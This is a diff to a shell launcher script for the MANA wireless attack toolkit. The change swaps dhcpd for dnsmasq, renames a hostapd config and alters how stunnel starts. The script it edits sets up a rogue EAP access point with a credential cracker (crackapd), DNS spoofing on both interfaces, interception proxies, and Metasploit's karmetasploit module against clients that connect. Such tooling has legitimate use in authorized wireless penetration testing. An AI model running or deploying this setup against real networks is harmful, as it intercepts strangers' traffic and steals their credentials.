@@ -2,7 +2,7 @@
 
 phy=wlan0
 phy0="wlan0_0"
-conf=/etc/mana-toolkit/hostapd-karma-eap.conf
+conf=/etc/mana-toolkit/hostapd-mana-eap.conf
 hostapd=/usr/lib/mana-toolkit/hostapd
 crackapd=/usr/share/mana-toolkit/crackapd/crackapd.py
 
@@ -32,13 +32,12 @@ route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 ifconfig $phy0 10.1.0.1 netmask 255.255.255.0
 route add -net 10.1.0.0 netmask 255.255.255.0 gw 10.1.0.1
 
-dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy
-touch /var/lib/dhcp/dhcpd-two.leases
-dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf /etc/mana-toolkit/dhcpd-two.conf $phy0
+dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo
+dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd-two.conf -i $phy0 -I lo
 dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
 dnsspoof -i $phy0 -f /etc/mana-toolkit/dnsspoof.conf&
 service apache2 start
-service stunnel4 start
+stunnel4 /etc/mana-toolkit/stunnel.conf
 tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
 msfconsole -r /etc/mana-toolkit/karmetasploit.rc&
 
@@ -54,7 +53,7 @@ read
 pkill hostapd
 rm /tmp/crackapd.run
 rm $EXNODE
-pkill dhcpd
+pkill dnsmasq
 pkill dnsspoof
 pkill tinyproxy
 pkill stunnel4
